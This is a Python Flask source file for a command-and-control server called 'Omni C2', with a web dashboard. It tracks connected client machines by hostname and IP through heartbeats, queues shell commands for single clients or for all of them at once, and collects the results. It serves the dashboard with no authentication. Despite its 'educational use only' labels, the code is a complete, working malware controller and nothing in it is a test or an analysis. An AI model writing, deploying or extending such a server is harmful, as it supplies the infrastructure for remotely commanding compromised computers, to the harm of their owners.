#!/usr/bin/env python3
"""
Enhanced C2 Server with Web Dashboard
Educational purposes only
"""

from flask import Flask, request, jsonify, render_template_string
from datetime import datetime, timedelta
import json
import threading
import time
from collections import defaultdict

app = Flask(__name__)

# Store client data
clients = {}
commands = defaultdict(str)
activity_log = []

# HTML Dashboard
DASHBOARD_HTML = '''
<!DOCTYPE html>
<html>
<head>
    <title>🔧 Omni C2 Dashboard</title>
    <meta charset="utf-8">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: Arial, sans-serif; }
        body { background: #1a1a2e; color: #fff; padding: 20px; }
        .container { max-width: 1200px; margin: 0 auto; background: #16213e; border-radius: 10px; padding: 20px; }
        header { text-align: center; margin-bottom: 30px; }
        h1 { color: #0fce79; }
        .stats { display: flex; gap: 20px; margin-bottom: 30px; }
        .stat-card { flex: 1; background: #0f3460; padding: 20px; border-radius: 8px; text-align: center; }
        .stat-value { font-size: 2em; font-weight: bold; color: #0fce79; }
        table { width: 100%; border-collapse: collapse; background: #0f3460; }
        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #1a1a2e; }
        th { background: #0f3460; }
        .online { color: #0fce79; }
        .offline { color: #ff4d4d; }
        .command-form { display: flex; gap: 10px; margin: 20px 0; }
        input, button { padding: 10px; border-radius: 5px; border: none; }
        button { background: #0fce79; color: #000; font-weight: bold; cursor: pointer; }
        footer { margin-top: 30px; text-align: center; color: #888; font-size: 0.9em; }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🔧 Omni C2 Dashboard</h1>
            <p>Educational Security Testing</p>
        </header>
        
        <div class="stats">
            <div class="stat-card">
                <h3>Online Clients</h3>
                <div class="stat-value" id="onlineCount">0</div>
            </div>
            <div class="stat-card">
                <h3>Total Clients</h3>
                <div class="stat-value" id="totalCount">0</div>
            </div>
            <div class="stat-card">
                <h3>Commands</h3>
                <div class="stat-value" id="commandCount">0</div>
            </div>
        </div>
        
        <h2>Connected Clients</h2>
        <table id="clientTable">
            <thead>
                <tr><th>Hostname</th><th>IP</th><th>Last Seen</th><th>Status</th></tr>
            </thead>
            <tbody></tbody>
        </table>
        
        <div class="command-form">
            <input type="text" id="clientId" placeholder="Client ID (empty for broadcast)">
            <input type="text" id="commandInput" placeholder="Command (e.g., 'whoami')">
            <button onclick="sendCommand()">Send</button>
        </div>
        
        <footer>
            <p>⚠️ Educational Use Only - Authorized Testing Only</p>
        </footer>
    </div>
    
    <script>
        function updateDashboard() {
            fetch('/api/clients')
                .then(r => r.json())
                .then(data => {
                    // Update stats
                    const online = Object.values(data.clients).filter(c => 
                        Date.now() - new Date(c.last_seen) < 300000
                    ).length;
                    document.getElementById('onlineCount').textContent = online;
                    document.getElementById('totalCount').textContent = Object.keys(data.clients).length;
                    document.getElementById('commandCount').textContent = Object.keys(data.commands).length;
                    
                    // Update table
                    const tbody = document.querySelector('#clientTable tbody');
                    tbody.innerHTML = '';
                    Object.entries(data.clients).forEach(([id, client]) => {
                        const isOnline = Date.now() - new Date(client.last_seen) < 300000;
                        const row = document.createElement('tr');
                        row.innerHTML = `
                            <td>${client.data?.hostname || 'Unknown'}</td>
                            <td>${client.data?.ip || 'Unknown'}</td>
                            <td>${new Date(client.last_seen).toLocaleTimeString()}</td>
                            <td class="${isOnline ? 'online' : 'offline'}">
                                ${isOnline ? '🟢 Online' : '🔴 Offline'}
                            </td>
                        `;
                        tbody.appendChild(row);
                    });
                });
        }
        
        function sendCommand() {
            const clientId = document.getElementById('clientId').value;
            const command = document.getElementById('commandInput').value;
            
            fetch('/api/command', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ client_id: clientId || 'broadcast', command: command })
            }).then(r => r.json()).then(data => {
                alert(data.status === 'success' ? 'Command sent!' : 'Failed');
                document.getElementById('commandInput').value = '';
            });
        }
        
        setInterval(updateDashboard, 3000);
        updateDashboard();
    </script>
</body>
</html>
'''

@app.route('/')
def dashboard():
    return render_template_string(DASHBOARD_HTML)

@app.route('/api/clients', methods=['GET'])
def get_clients():
    return jsonify({
        'clients': clients,
        'commands': dict(commands),
        'timestamp': datetime.now().isoformat()
    })

@app.route('/heartbeat', methods=['POST'])
def heartbeat():
    data = request.json or request.form.to_dict()
    
    if not data:
        return jsonify({'command': 'none'})
    
    client_id = f"{data.get('ip', 'unknown')}-{data.get('hostname', 'unknown')}"
    clients[client_id] = {
        'last_seen': datetime.now().isoformat(),
        'data': data
    }
    
    # Check for commands
    pending_command = commands.get(client_id, '')
    broadcast_command = commands.get('broadcast', '')
    
    if broadcast_command:
        response_command = broadcast_command
        del commands['broadcast']
    elif pending_command:
        response_command = pending_command
        del commands[client_id]
    else:
        response_command = 'none'
    
    return jsonify({'command': response_command})

@app.route('/api/command', methods=['POST'])
def set_command():
    data = request.json
    client_id = data.get('client_id')
    command = data.get('command')
    
    if client_id == 'broadcast':
        commands['broadcast'] = command
    elif client_id:
        commands[client_id] = command
    
    return jsonify({'status': 'success', 'message': 'Command set'})

@app.route('/result', methods=['POST'])
def command_result():
    data = request.json
    print(f"[RESULT] {data.get('client', 'unknown')}: {data.get('command', 'unknown')}")
    return jsonify({'status': 'received'})

def cleanup_thread():
    while True:
        time.sleep(300)
        try:
            threshold = datetime.now() - timedelta(minutes=10)
            for client_id, client_data in list(clients.items()):
                last_seen = datetime.fromisoformat(client_data['last_seen'])
                if last_seen < threshold:
                    del clients[client_id]
        except:
            pass

if __name__ == "__main__":
    print("="*50)
    print("🔧 OMNI C2 SERVER STARTING")
    print("="*50)
    print("Dashboard: http://localhost:5000")
    print("API: http://localhost:5000/api/clients")
    print("Heartbeat endpoint: /heartbeat")
    print("="*50)
    print("⚠️  EDUCATIONAL USE ONLY")
    print("="*50)
    
    threading.Thread(target=cleanup_thread, daemon=True).start()
    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)
